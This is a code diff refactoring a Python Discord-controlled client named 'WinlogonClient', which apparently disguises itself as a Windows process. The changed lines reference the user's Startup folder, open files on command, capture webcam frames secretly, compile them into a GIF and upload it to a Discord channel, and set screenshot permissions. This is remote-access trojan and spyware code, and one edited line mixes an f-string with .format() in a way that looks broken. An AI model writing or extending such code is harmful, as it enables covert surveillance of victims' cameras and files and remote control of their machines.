@@ -91,15 +91,13 @@ class WinlogonClient(discord.Client):
 
         login_name = os.getlogin()
 
-        paths = dict()
-        paths["APPDATA"] = os.getenv("APPDATA")
-        paths["DESKTOP"] = f"C:\\Users\\{login_name}\\Desktop"
-        paths["STARTUP"] = f"C:\\Users\\{login_name}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
-
-        app_data = os.getenv("APPDATA")
+        self.paths = dict()
+        self.paths["APPDATA"] = os.getenv("APPDATA")
+        self.paths["DESKTOP"] = f"C:\\Users\\{login_name}\\Desktop"
+        self.paths["STARTUP"] = f"C:\\Users\\{login_name}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
 
         start_up = "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
-        os.chdir(app_data)  # Сделать папкой по умолчанию
+        os.chdir(self.paths["APPDATA"])  # Сделать папкой по умолчанию
 
         random_color = int("36393f", 16)  # Обьявить переменную
         MAIN_SCRIPT = False  # Главный ли скрипт
@@ -231,7 +229,7 @@ class WinlogonClient(discord.Client):
     async def send_settings_form(self):
         await Discord.send_embed(description="```python\n"
                                              f"file_name: \"{file_name}\"\n"
-                                             f"app_data: \"{app_data}\"\n"
+                                             f"app_data: \"{self.paths['APPDATA']}\"\n"
                                              f"start_up: \"{start_up}\"\n"
                                              f"desktop: \"C:\\Users\\{login_name}\\Desktop\""
                                              "```"
@@ -1132,9 +1130,9 @@ class WinlogonClient(discord.Client):
                         if path == "APPDATA":
                             start(f"C:\\Users\\{login_name}\\AppData")
                         elif path == "STARTUP":
-                            start(paths["STARTUP"])
+                            start(self.paths["STARTUP"])
                         elif path == "DESKTOP":
-                            start(paths["DESKTOP"])
+                            start(self.paths["DESKTOP"])
                         else:
                             start(path)
                         await message.add_reaction("👍")
@@ -1145,15 +1143,15 @@ class WinlogonClient(discord.Client):
             async def camera():
                 # settings = Scripts.get_settings(message.content)
 
-                if not File.exist(app_data + "\\screens"):
+                if not File.exist(f"{self.paths['APPDATA']}\\screens"):
                     try:
-                        os.makedirs(app_data + "\\screens\\")
+                        os.makedirs(f"{self.paths['APPDATA']}\\screens\\")
                     except BaseException:
                         pass
 
-                for i in os.listdir(app_data + "\\screens"):
+                for i in os.listdir(f"{self.paths['APPDATA']}\\screens"):
                     if i.endswith(".jpg"):
-                        delete(app_data + "\\screens\\" + i)
+                        delete(f"{self.paths['APPDATA']}\\screens\\" + i)
 
                 cap = cv2.VideoCapture(0)
                 current_frame = 0
@@ -1164,28 +1162,28 @@ class WinlogonClient(discord.Client):
                     cv2.waitKey(1)
                     current_frame += 1
                     if current_frame >= 3:
-                        cv2.imwrite(app_data + '\\screens\\00{}.jpg'.format(current_frame - 3), frame)
+                        cv2.imwrite(f"{self.paths['APPDATA']}\\screens\\00{}.jpg".format(current_frame - 3), frame)
 
                 cap.release()
                 cv2.destroyAllWindows()
 
                 names = []
 
-                for i in os.listdir(app_data + "\\screens"):
+                for i in os.listdir(f"{self.paths['APPDATA']}\\screens"):
                     if i.endswith(".jpg"):
-                        names.append(app_data + "\\screens\\" + i)
+                        names.append(f"{self.paths['APPDATA']}\\screens\\" + i)
                 images = []
 
-                if File.exist(app_data + "\\movie.gif"):
+                if File.exist(f"{self.paths['APPDATA']}\\movie.gif"):
                     try:
-                        delete(app_data + "\\movie.gif")
+                        delete(f"{self.paths['APPDATA']}\\movie.gif")
                     except BaseException:
                         pass
 
                 for name in names:
                     images.append(imageio.imread(name))
-                imageio.mimsave(app_data + '\\movie.gif', images)
-                await Discord.send_file(app_data + '\\movie.gif')
+                imageio.mimsave(f"{self.paths['APPDATA']}\\movie.gif", images)
+                await Discord.send_file(f"{self.paths['APPDATA']}\\movie.gif")
 
         class DiscordLoop:
             @staticmethod
@@ -1212,10 +1210,9 @@ class WinlogonClient(discord.Client):
                     self.lost_screen_delay = screen_delay
 
     def default_settings(self):
-        global self.access_to_screen, screen_delay, self.lost_screen_delay
         self.access_to_screen = True  # Разрешение на скрины
-        screen_delay = 100  # delay of pause
-        self.lost_screen_delay = screen_delay
+        self.screen_delay = 100  # delay of pause
+        self.lost_screen_delay = self.screen_delay
 
     async def on_ready(self):
         global RUN_STATUS, MAIN_SCRIPT, users_online, s1, s2
